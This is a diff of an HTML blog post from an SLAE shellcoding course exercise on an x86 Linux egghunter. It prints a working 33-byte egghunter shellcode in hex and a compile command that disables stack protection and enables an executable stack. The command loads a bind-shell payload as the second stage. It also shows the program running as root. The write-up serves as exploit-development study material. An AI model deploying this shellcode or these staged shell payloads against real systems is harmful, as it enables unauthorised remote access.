@@ -375,7 +375,7 @@ Student-ID: SLAE-1154
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>To run the shellcode, like before, the configure command should be issued first, followed by make. The second stage payload can be specified by the STAGE2 variable:</p>
+<p>To run the shellcode, like before, the configure command should be issued first, followed by make. The second stage payload can be specified by the <strong>STAGE2</strong> variable:</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -440,7 +440,7 @@ Student-ID: SLAE-1154
 </span><span class='line'> 804807f:       ff e7                   jmp    edi
 </span><span class='line'>Shellcode size: 33
 </span><span class='line'><span class="se">\x</span>fc<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span>6a<span class="se">\x</span>28<span class="se">\x</span>58<span class="se">\x</span>43<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>3c<span class="se">\x</span>f2<span class="se">\x</span>75<span class="se">\x</span>07<span class="se">\x</span>66<span class="se">\x</span>81<span class="se">\x</span>cb<span class="se">\x</span>ff<span class="se">\x</span>0f<span class="se">\x</span>eb<span class="se">\x</span>ef<span class="se">\x</span>b8<span class="se">\x</span>bd<span class="se">\x</span>ba<span class="se">\x</span>fe<span class="se">\x</span>ca<span class="se">\x</span>40<span class="se">\x</span>89<span class="se">\x</span>df<span class="se">\x</span>af<span class="se">\x</span>75<span class="se">\x</span>e4<span class="se">\x</span>ff<span class="se">\x</span>e7
-</span><span class='line'>cc -DEGGHUNTER<span class="o">=</span><span class="sb">`</span>asm-opcodes egghunter<span class="sb">`</span> -DSHELLCODE<span class="o">=</span><span class="sb">`</span>asm-opcodes ../0x02-reverse/reverse<span class="sb">`</span> -W -Wall -fno-stack-protector -zexecstack -o shellcode skel.c
+</span><span class='line'>cc -DSHELLCODE<span class="o">=</span><span class="sb">`</span>asm-opcodes egghunter<span class="sb">`</span> -DSTAGE2<span class="o">=</span><span class="sb">`</span>asm-opcodes ../0x01-bind/bind<span class="sb">`</span> -W -Wall -fno-stack-protector -zexecstack -o shellcode skel.c
 </span></code></pre></td></tr></table></div></figure>
 
 
@@ -461,7 +461,7 @@ Student-ID: SLAE-1154
 </span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
 </span><span class='line'><span class="c"># ./shellcode</span>
 </span><span class='line'>Egghunter length: 33
-</span><span class='line'>Shellcode length: 74
+</span><span class='line'>Second stage length: 70
 </span></code></pre></td></tr></table></div></figure>
 
 </div>
@@ -520,6 +520,10 @@ Student-ID: SLAE-1154
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2018/07/28/slae-0x06-polymorphic-shellcodes/">SLAE 0x06: Polymorphic Shellcodes</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2018/07/18/slae-0x05-metasploit-payloads/">SLAE 0x05: Metasploit Payloads</a>
       </li>
     
@@ -533,10 +537,6 @@ Student-ID: SLAE-1154
     
       <li class="post">
         <a href="/blog/2018/05/21/slae-0x02-reverse-tcp-shell/">SLAE 0x02: Reverse TCP Shell</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2018/05/20/slae-0x01-bind-tcp-shell/">SLAE 0x01: Bind TCP Shell</a>
       </li>
     
   </ul>
